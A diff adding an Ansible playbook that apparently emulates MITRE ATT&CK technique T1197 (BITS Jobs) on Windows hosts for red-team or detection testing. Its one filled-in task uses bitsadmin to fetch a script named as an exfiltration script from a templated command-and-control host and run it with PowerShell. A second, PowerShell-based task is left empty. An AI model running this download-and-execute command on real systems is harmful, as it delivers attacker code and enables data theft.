@@ -1,0 +1,16 @@
+
+# attack_technique: T1197
+- name: T1197 - BITS Jobs
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+        - name: download and execute via CMD
+          tags: CMD
+          win_command: |
+            bitsadmin.exe  /transfer /Download /priority Foreground http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} %TEMP%\{{ exfil_script_windows }}&powershell {{ exfil_script_windows }} 
+        - name: download and execute via POWERSHELL
+          tags: PSH
+          win_shell: |
+            
+        
